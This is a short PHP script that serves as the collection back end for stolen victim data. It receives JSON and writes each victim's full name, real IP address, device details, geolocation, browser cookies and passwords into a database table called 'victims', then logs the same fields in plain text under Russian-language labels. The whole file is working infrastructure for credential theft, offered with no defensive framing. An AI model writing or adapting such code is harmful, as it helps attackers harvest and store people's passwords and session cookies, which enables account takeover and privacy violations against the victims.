<?php
include 'admin/functions/db_connect.php';

$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

$deviceInfo = isset($data['deviceInfo']) ? json_encode($data['deviceInfo']) : '';
$geoInfo = isset($data['geoInfo']) ? json_encode($data['geoInfo']) : '';
$realIP = isset($data['realIP']) ? $data['realIP'] : '';
$fullName = isset($data['fullName']) ? $data['fullName'] : '';
$cookies = isset($data['cookies']) ? $data['cookies'] : '';
$passwords = isset($data['passwords']) ? json_encode($data['passwords']) : '';

$sql = "INSERT INTO victims (fullName, realIP, deviceInfo, geoInfo, cookies, passwords) VALUES (?, ?, ?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssssss", $fullName, $realIP, $deviceInfo, $geoInfo, $cookies, $passwords);

if ($stmt->execute()) {
    $logData = "---------Новая запись---------\n";
    $logData .= "ФИО: " . $fullName . "\n";
    $logData .= "Реальный IP: " . $realIP . "\n";
    $logData .= "Геолокация: " . $geoInfo . "\n";
    $logData .= "Информация об устройстве: " . $deviceInfo . "\n";
    $logData .= "Куки: " . $cookies . "\n";
    $logData .= "Пароли: " . $passwords . "\n";
    $logData .= "\n";
    file_put_contents('data.log', $logData, FILE_APPEND);
} else {
    echo "Ошибка: " . $sql . "<br>" . $conn->error;
}

$stmt->close();
$conn->close();
?>
